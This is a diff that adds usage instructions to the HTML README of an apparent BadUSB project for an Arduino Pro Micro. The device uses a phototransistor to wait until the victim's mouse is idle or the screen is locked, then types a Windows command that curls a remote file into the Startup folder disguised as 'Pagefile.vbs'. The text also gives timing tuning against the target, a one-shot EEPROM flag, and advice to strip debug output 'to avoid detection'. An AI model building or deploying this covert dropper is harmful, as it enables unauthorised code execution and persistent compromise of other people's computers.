@@ -23,6 +23,51 @@
     <li>Soldering Iron & Solder</li>
 </ul>
 
+<h2>Using the Program</h2>
+<p>This program is designed to operate with specific pin settings and timing variables to effectively deploy a payload on Windows systems. Below are instructions on how to adjust key parameters and deploy the payload safely and effectively.</p>
+
+<h3>Pin Configuration</h3>
+<p>Do not change the pin configuration unless necessary, as they are set to match the hardware setup:</p>
+<ul>
+    <li><strong>photoTransistorPin</strong>: Analog pin A2, used for the phototransistor sensor.</li>
+    <li><strong>VCCPin</strong>: Digital pin 15, used as VCC.</li>
+    <li><strong>GNDPin</strong>: Digital pin 16, used as ground.</li>
+</ul>
+
+<h3>Timing Variables</h3>
+<p>Adjust the following timing variables based on the environmental conditions and the Windows system you are targeting:</p>
+<ul>
+    <li><strong>interval</strong> (500 ms): Frequency at which the sensor checks are performed.</li>
+    <li><strong>bootTime</strong> (5000 ms): Wait time after the device is powered on, allowing the PC to boot.</li>
+    <li><strong>inactiveTime</strong> (5000 ms): Duration to consider the mouse inactive if no movement is detected.</li>
+    <li><strong>lockToCoverScreenTime</strong> (65000 ms): Time to wait for the Windows lock screen to revert to the cover screen.</li>
+    <li><strong>activeSensorCount</strong> (500): Count of sensor readings indicating active mouse usage before considering the mouse active.</li>
+    <li><strong>activeSensorValue</strong> (1016): Sensor reading threshold to determine mouse activity. Adjust based on your phototransistor's sensitivity.</li>
+</ul>
+
+<h3>Payload Execution</h3>
+<p>To modify the payload, alter the command within the <code>executePayload</code> function:</p>
+<pre>
+Keyboard.print("cmd /c curl -L URL -o \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Pagefile.vbs\" >nul 2>&1");
+</pre>
+<p>Replace the URL and file path as needed for your specific payload. Ensure that the commands are compatible with the Windows command line interface.</p>
+<h3>Operational Flow</h3>
+<p>Upon startup, the device checks if it has executed the payload previously through EEPROM state checking. If the payload has not been executed, it continues with the boot process, waiting for the PC to boot, and detecting mouse and system activity to determine the optimal time to deploy the payload.</p>
+
+<h3>Compatibility</h3>
+<p>Currently, this program is designed to work exclusively with Windows-based systems. It leverages specific Windows features, such as the "Run" dialog and keyboard shortcuts, to execute its payload effectively.</p>
+<p>Support for Mac and Linux systems is under development, focusing on adapting to different system behaviors and command execution methods specific to these platforms.</p>
+
+<h3>Resetting the Device</h3>
+<p>If you need to reset the device and clear the EEPROM:</p>
+<pre>
+// To reset the EEPROM, short pin 8 to ground momentarily. This clears the flag and allows the payload to be executed again.
+EEPROM.write(0, 0);
+</pre>
+
+<h3>Debugging</h3>
+<p>For debugging purposes, use the serial output to monitor the status and operation of the device. Ensure to disable or remove serial debugging in the final deployment to avoid detection.</p>
+
 <h2>Installation and Setup</h2>
 <p>Refer to the Arduino IDE for uploading the provided <code>20231127_badusb_experimental.ino</code> script to the Arduino Pro Micro. Detailed wiring instructions and setup procedures can be found in the documentation linked below.</p>
 <a href="https://github.com/BhawksGit/SmartBadUSB">GitHub Repository</a>
